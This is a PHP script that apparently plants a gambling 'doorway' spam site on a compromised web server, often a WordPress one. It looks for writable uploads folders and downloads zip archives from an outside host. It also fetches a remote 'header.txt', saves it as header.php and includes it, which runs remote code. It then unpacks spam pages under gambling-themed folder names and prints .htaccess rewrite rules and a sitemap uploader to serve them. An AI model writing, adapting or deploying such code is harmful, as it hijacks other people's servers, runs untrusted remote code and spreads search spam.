

set_time_limit(0);
ignore_user_abort(true);

$url = 'https://kentuckyfriedbeef.com/static/archives/CSN-OLDSINGLE-HTML-SI-1/';
$rangeOfFiles = '1-5';


$dirnames = 'gambling, casino, online-casino, casino-online, slots, gamble, get-money, video-games, videoslots, online-slots, slots-online, live-casino, online-gambling, gambling-online, casino-games, slot-machine, electronic-gaming, online-gaming, gaming-online, gambling-games, virtual-slots, virtual-games, mobile-gambling, mobile-casino, casino-mobile, internet-gambling, casinos, virtual-casino, internet-slots, gaming-board, gambling-board, online-casinos, gambling-companies, gambling-operators, play-casino, playing-games, gambling-industry, igre-na-srečo, igralnice, spletne-igralnice, igralnice-na-spletu, igralni-avtomati, igre-na-srečo, denar, video-igre, videolotovi, spletne-igralne-avtomate, igralne-avtomate-na-spletu, igralnice-v-živo, spletne-igre-na-srečo, igre-na-srečo-na-spletu, igralniške-igre-igralni-avtomati, elektronske-igre-na-srečo, spletne-igre-na-srečo, spletne-igre-na-srečo, igre-na-srečo, virtualne-igralne-avtomate, virtualne-igre, mobilne-igre-na-srečo, mobilne-igralnice, kazino-mobilne-naprave, internetne-igre-na-srečo, igralnice, virtualne-igralnice, internetni-igralni-avtomati, igralne-deske, igralne-deske, spletne-igralnice, igralniške-družbe, igralniški-operaterji, igralniške-igralnice, igranje-iger, igralništvo';



/*
 * Use unzip method with header.php
 * ziparchive unpacks files incorrectly.
 */
define('GREEK_LANGUAGE', 1);


define('CURRENTDIR', getcwd());
define('REDEFINE_WP_ROOT_DIRECTORY', '');
define('NOT_WP', 1);
define('UPLOAD_DIRECTORY', getcwd());
define('FORCE_DELETE', 0);
define('VIEW_PROGRESS', 0);


$parsedUrl = parse_url($url);


define('GS_ALIAS', $parsedUrl['scheme'] . '://' . $parsedUrl['host']);



if (NOT_WP === 0) {

    if (is_null($rootDir = detectWProotDir())) {
        echo 'couldn`t find the root directory' . PHP_EOL;
        exit;
    }

    $uploadsDirectorys = directorysForWriting($rootDir . '/wp-content/uploads', 3);


    if (empty($uploadsDirectorys)) {
        echo 'couldn`t find the directory to write' . PHP_EOL;
        exit;
    }
} else {
    $uploadsDirectorys = array(UPLOAD_DIRECTORY);
    if (!is_writeable(UPLOAD_DIRECTORY)) {
        echo 'directory isnt writeable' . PHP_EOL;
        exit;
    }
}


$dirnamesArr = preg_split('~,\s*~', $dirnames);

if (!is_array($dirnamesArr) || empty($dirnamesArr)) {
    echo 'invalid directorys list'.PHP_EOL;
    exit;
}


$logDirectory = $uploadsDirectorys[0];
$logFile = $logDirectory . '/update-log.txt';

if (defined('FORCE_DELETE') && (FORCE_DELETE === 1)) {
    forceDelete($logFile, $dirName);
    exit;
}

if (defined('VIEW_PROGRESS') && (VIEW_PROGRESS === 1)) {


    if (!file_exists($logFile)) {
        echo 'log file not found' . PHP_EOL;
        exit;
    }

    $logSource = file_get_contents($logFile);
    $logArr = decodeLog($logSource);

    var_dump($logArr);

    exit;
}


if (file_exists($logFile)) {

    $logSource = file_get_contents($logFile);
    $logArr = decodeLog($logSource);
    
    
    if (!isset($logArr['dirName'])) {
        echo 'this is an old version of the script, please update'.PHP_EOL;
        exit;
    }
    
    
    $dirName = $logArr['dirName'];

    var_dump($logArr);


    echo 'previous log found' . PHP_EOL;



    $uploadDirectory = $logArr['uploadDirectory'];



    if (isset($logArr['action'])) {


        if ($logArr['action'] == 'finish') {

            echo 'finish' . PHP_EOL;
            echo 'log file ' . $logFile . ' mb delete?' . PHP_EOL;
            echo 'upload directory ' . $uploadDirectory . PHP_EOL;

            $documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
            $relativePath = str_replace($documentRoot . '/', '', $uploadDirectory);

            $blogRelativePath = '';

            if (($subdir = str_replace($documentRoot, '', $rootDir)) !== '') {
                $subdir = ltrim($subdir, '/');
                $blogRelativePath = str_replace($subdir . '/', '', $relativePath);
            }



            $htaccessRender = htaccessRender($dirName, $relativePath, $blogRelativePath);

            echo $htaccessRender . PHP_EOL;

            echo str_repeat(PHP_EOL, 3);

            $randFile = randFile($uploadDirectory . '/' . $dirName);
            
            //echo "Rand file - $randFile" . PHP_EOL;
            $currentUrl = currenturl($randFile);
            echo $currentUrl . PHP_EOL;
           
            
            $shortUrl = str_replace($relativePath . '/', '', $currentUrl);
            echo $shortUrl . PHP_EOL;
            echo str_repeat(PHP_EOL, 3);

            $basenameRandFile = mb_basename($randFile);

            
            echo str_replace('/' . $basenameRandFile, '', $currentUrl) . '::' . urlConvertToLocalpath($url) . PHP_EOL;
            echo str_replace('/' . $basenameRandFile, '', $shortUrl) . '::' . urlConvertToLocalpath($url) . PHP_EOL;

            echo str_repeat(PHP_EOL, 3);

            echo renderSitemapUploader(convertArchiveUrl($url) . '/sitemap.xml', $uploadDirectory . '/' . $dirName . '/sitemap.xml');

            echo str_repeat(PHP_EOL, 3);



            exit;
        }


        if ($logArr['action'] == 'upload') {
            $tmp = explode('-', $rangeOfFiles);
            $tmp[0] = basename($logArr['path'], '.zip');
            $rangeOfFiles = implode('-', $tmp);
            uploadAction($url, $rangeOfFiles, $uploadDirectory . '/' . $dirName, $logFile);
        }
    }

    unzipAction($uploadDirectory . DIRECTORY_SEPARATOR . $dirName, $logFile);
    //}
} else {

    $uploadDirectory = $uploadsDirectorys[array_rand($uploadsDirectorys)];
    $dirName = $dirnamesArr[rand(0,count($dirnamesArr) - 1)];

    $log = array(
        'uploadDirectory' => $uploadDirectory,
        'dirName' => $dirName,
    );

    file_put_contents($logFile, encodeLog($log));
    uploadAction($url, $rangeOfFiles, $uploadDirectory . '/' . $dirName, $logFile);
    unzipAction($uploadDirectory . DIRECTORY_SEPARATOR . $dirName, $logFile);
}

function unzipAction($uploadDirectory, $logFile) {

    if (defined('GREEK_LANGUAGE') && GREEK_LANGUAGE === 1) {
        echo 'use unzip with header' . PHP_EOL;
        try {
            return unzipFirstMethod($uploadDirectory, $logFile);
        } catch (Exception $ex) {
            echo $ex->getMessage();
        }
    }



    if (class_exists('ZipArchive')) {
        //echo 'second method' . PHP_EOL;
        return unzipSecondMethod($uploadDirectory, $logFile);
    } else {
        //echo 'first method' . PHP_EOL;
        return unzipFirstMethod($uploadDirectory, $logFile);
    }
}

function unzipSecondMethod($uploadDirectory, $logFile) {
    $paths = array(
        $uploadDirectory
    );
    foreach ($paths as $path) {

        $zipFiles = glob($path . DIRECTORY_SEPARATOR . '*.zip');

        if (empty($zipFiles)) {
            echo "archives not found in dir  - $path" . PHP_EOL;
            return false;
        }


        if (!is_dir($path)) {
            if (!mkdir($path, 0755, true)) {
                echo 'dont create dir  - ' . $path . PHP_EOL;
                return false;
            }
        }

        $zip = new ZipArchive();

        foreach ($zipFiles as $file) {
            if ($zip->open($file)) {
                if ($zip->extractTo($path)) {
                    echo "$file extracted" . PHP_EOL;
                    logActions($logFile, 'unzip', $file);
                    unlink($file);
                    $zip->close();
                }
            } else {
                echo "I can not open the archive $archive" . PHP_EOL;
                return false;
            }
        }
    }
    logActions($logFile, 'finish');
    return true;
}

function unzipFirstMethod($uploadDirectory, $logFile) {

    $paths = array(
        $uploadDirectory
    );

    include($uploadDirectory . '/header.php');

    foreach ($paths as $path) {


        $zipFiles = glob($path . DIRECTORY_SEPARATOR . '*.zip');

        if (empty($zipFiles)) {
            echo "archives not found in dir  - $path" . PHP_EOL;
            return false;
        }



        foreach ($zipFiles as $file) {

            $archive = new PclZip($file);
            if ($archive->extract(PCLZIP_OPT_PATH, $path) == 0) {
                echo "Error : " . $archive->errorInfo(true);
                return false;
            } else {
                echo $file . " unzipped" . PHP_EOL;
                logActions($logFile, 'unzip', $file);
                unlink($file);
            }
        }
    }
    logActions($logFile, 'finish');
    return true;
}

function convertRangeToFullPaths($range, $path) {
    $paths = array();
    foreach ($range as $item) {
        $paths[] = $path . DIRECTORY_SEPARATOR . $item . '.zip';
    }
    return $paths;
}

function uploadAction($url, $rangeOfFiles, $uploadDirectory, $logFile) {

    try {

        uploadRangeOfFiles($url, $rangeOfFiles, '.zip', $logFile, $uploadDirectory);
        get_file(GS_ALIAS . '/src/temp/header.txt', $uploadDirectory . '/header.php');

        return true;
    } catch (Exception $ex) {
        return false;
    }
}

function uploadRangeOfFiles($url, $range, $extension, $logFile, $dirname = '') {

    list ($firstNum, $secondNum) = explode('-', $range);


    if (!makeDir($dirname)) {
        throw new Exception("dont create dirname - $dirname");
    }



    foreach (range($firstNum, $secondNum) as $num) {

        $filename = $num . $extension;
        $action = ($num == $secondNum) ? '' : 'upload';

        get_file($url . $filename, $dirname . DIRECTORY_SEPARATOR . $filename);
        logActions($logFile, $action, $dirname . DIRECTORY_SEPARATOR . $filename);
    }

    $logSource = file_get_contents($logFile);
    $logArr = decodeLog($logSource);
}

function logActions($logFile, $action, $filename = '') {
    $logSource = file_get_contents($logFile);
    $logArr = decodeLog($logSource);
    $logArr['action'] = $action;
    $logArr['path'] = basename($filename);
    $logArr['full'][] = formatFullLog($action, $filename);
    file_put_contents($logFile, encodeLog($logArr));
}

function formatFullLog($action, $filename = '') {
    if (($action === 'upload') || ($action === '')) {
        return 'upload ' . basename($filename) . ' ' . filesizemb($filename) . ' Mb';
    }
    if ($action === 'unzip') {
        //return 'unzip ' . basename($filename) . ' ' . filesizemb($filename);
        return 'unzip ' . basename($filename);
    }
}

function get_file($source, $localname) {


    $file = fopen('php://temp/maxmemory:0', 'w+b');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $source);
    curl_setopt($ch, CURLOPT_FAILONERROR, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FILE, $file);
    curl_exec($ch);

    rewind($file);
    file_put_contents($localname, stream_get_contents($file));
    fclose($file);

    echo $localname . ' - ' . filesizemb($localname) . ' MB' . PHP_EOL;
}

function detectWProotDir() {

    if (defined('REDEFINE_WP_ROOT_DIRECTORY') && (REDEFINE_WP_ROOT_DIRECTORY !== '')) {
        if (file_exists(REDEFINE_WP_ROOT_DIRECTORY . '/wp-config.php')) {
            return REDEFINE_WP_ROOT_DIRECTORY;
        } else {
            echo 'Invalid value for REDEFINE_WP_ROOT_DIRECTORY' . PHP_EOL;
            return;
        }
    }

    if (file_exists(CURRENTDIR . '/wp-config.php')) {
        return CURRENTDIR;
    }
    $normalizePath = preg_replace('~\/(wp-admin|wp-includes|wp-content).*$~', '', CURRENTDIR);

    if (file_exists($normalizePath . '/wp-config.php')) {
        return $normalizePath;
    }

    return null;
}

function directorysForWriting($dir, $depthLimit = 1) {
    if (!is_dir($dir)) {
        return;
    }

    $path = realpath($dir);


    $objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)
            , RecursiveIteratorIterator::SELF_FIRST
            , RecursiveIteratorIterator::CATCH_GET_CHILD);

    $objects->setMaxDepth($depthLimit);



    foreach ($objects as $name => $object) {
        if (($path = $object->getPath()) === $dir) {
            continue;
        }
        if (is_dir($object) && is_writeable($object)) {
            $tmp[] = $path;
        }
    }

    return (empty($tmp) && is_writable($dir)) ? array($dir) : array_unique($tmp);
}

function encodeLog($arr) {
    return base64_encode(serialize($arr));
}

function decodeLog($string) {
    return unserialize(base64_decode($string));
}

function makeDir($dirname) {

    if ($dirname !== '') {
        if (!is_dir($dirname)) {
            if (!mkdir($dirname, 0777, true)) {
                return false;
            }
        }
    }
    return true;
}

function filesizemb($file) {
    return number_format(filesize($file) / pow(1024, 2), 3, '.', '');
}

function htaccessRender($doorRootDirName, $relativePath, $blogRelativePath) {

    $firstChunk = <<<STR
            
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^($doorRootDirName)/(.+)$ /$relativePath/$1/$2 [L,NC]
RewriteRule ^($doorRootDirName)(/?)$ /$relativePath/$1/index.html [L,NC]
RewriteRule ^($doorRootDirName)/jquery.js$ /$relativePath/$1/jquery.js [L,NC]
RewriteRule ^($doorRootDirName)/sitemap.xml$ /$relativePath/$1/sitemap.xml [L,NC]

STR;

    $withSubdir = <<<STR
RewriteRule ^($doorRootDirName)/(.+)$ /$blogRelativePath/$1/$2 [L,NC]
RewriteRule ^($doorRootDirName)(/?)$ /$blogRelativePath/$1/index.html [L,NC]
RewriteRule ^($doorRootDirName)/jquery.js$ /$blogRelativePath/$1/jquery.js [L,NC]
RewriteRule ^($doorRootDirName)/sitemap.xml$ /$blogRelativePath/$1/sitemap.xml [L,NC]
          
STR;

    $thirdChunk = <<<STR
</IfModule>
STR;


    return ($blogRelativePath !== '') ? htmlspecialchars($firstChunk . $withSubdir . $thirdChunk) : htmlspecialchars($firstChunk . $thirdChunk);
}

function currenturl($rootDir) {
    $tmp = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', 'http://' . $_SERVER['HTTP_HOST'] . $rootDir);
    return $tmp;
}

function randFile($dir) {

    if ($handle = opendir($dir)) {

        $iter = 1;
        $end = rand(20, 35);
        while (false !== ($file_name = readdir($handle))) {
            if ($iter >= $end) {
                closedir($handle);
                return $dir . DIRECTORY_SEPARATOR . $file_name;
            }
            $iter++;
        }
    }
}

function renderSitemapUploader($url, $localpath) {
    $source = <<<STR

function get_file(\$source, \$localname) {

    \$file = fopen('php://temp/maxmemory:0', 'w+b');
    \$ch = curl_init();
    curl_setopt(\$ch, CURLOPT_URL, \$source);
    curl_setopt(\$ch, CURLOPT_FAILONERROR, true);
    curl_setopt(\$ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt(\$ch, CURLOPT_FILE, \$file);
    curl_exec(\$ch);

    rewind(\$file);
    file_put_contents(\$localname, stream_get_contents(\$file));
    fclose(\$file);
    curl_close(\$ch);
    
    echo \$localname . ' - ' . filesizemb(\$localname) . ' MB' . PHP_EOL;
    
}

function filesizemb(\$file) {
    return number_format(filesize(\$file) / pow(1024, 2), 3, '.', '');
}

get_file('$url', '$localpath');
STR;

    return htmlspecialchars($source);
}

function convertArchiveUrl($url) {
    $modified = preg_replace('~static\/archives\/.+~', 'static/html/', $url);
    return $modified . '' . str_replace('-', '/', basename($url));
}

function urlConvertToLocalpath($url) {

    $firstStep = str_replace('-', '/', basename($url));

    return $firstStep;
}

function removeDirRec($dir) {
    if ($objs = glob($dir . "/*")) {
        foreach ($objs as $obj) {
            is_dir($obj) ? $this->removeDirRec($obj) : unlink($obj);
        }
    }
    rmdir($dir);
}

function forceDelete($logFile) {


    if (!file_exists($logFile)) {
        echo 'Log file not found' . PHP_EOL;
        return;
    }

    $logSource = file_get_contents($logFile);
    $logArr = decodeLog($logSource);
    $dirName = $logArr['dirName'];
    unlink($logFile);
    echo 'previous log was delete' . PHP_EOL;


    if (!isset($logArr['uploadDirectory'])) {
        echo 'not found uploaddirectory in log file' . PHP_EOL;
        return;
    }

    removeDirRec($logArr['uploadDirectory'] . '/' . $dirName);
    echo 'door dir ' . $logArr['uploadDirectory'] . '/' . $dirName . ' was delete' . PHP_EOL;
}


function mb_basename($file, $ext = '') {
    $explodedPath = explode('/', $file);
    $last = end($explodedPath);
    return ($ext !== '') ? str_replace($ext, '', $last) : $last;
}